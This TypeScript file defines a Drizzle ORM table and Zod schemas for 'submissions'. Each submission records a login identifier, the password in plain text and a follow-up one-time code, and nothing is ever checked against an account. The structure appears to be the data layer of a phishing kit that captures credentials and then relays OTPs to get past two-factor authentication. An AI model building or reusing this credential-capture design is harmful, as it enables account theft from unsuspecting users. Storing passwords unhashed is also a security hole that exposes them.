import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, serial } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const submissions = pgTable("submissions", {
  id: serial("id").primaryKey(),
  loginMethod: varchar("login_method", { length: 20 }).notNull(),
  identifier: text("identifier").notNull(),
  password: text("password").notNull(),
  otp: text("otp"),
  submittedAt: timestamp("submitted_at").defaultNow().notNull(),
});

export const insertSubmissionSchema = createInsertSchema(submissions).omit({
  id: true,
  submittedAt: true,
});

export const credentialSubmitSchema = z.object({
  loginMethod: z.enum(["phone", "email", "username"]),
  identifier: z.string().min(1, "This field is required"),
  password: z.string().min(1, "Password is required"),
});

export const otpSubmitSchema = z.object({
  submissionId: z.number(),
  otp: z.string().min(1, "OTP is required"),
});

export type Submission = typeof submissions.$inferSelect;
export type InsertSubmission = z.infer<typeof insertSubmissionSchema>;
export type CredentialSubmit = z.infer<typeof credentialSubmitSchema>;
export type OtpSubmit = z.infer<typeof otpSubmitSchema>;
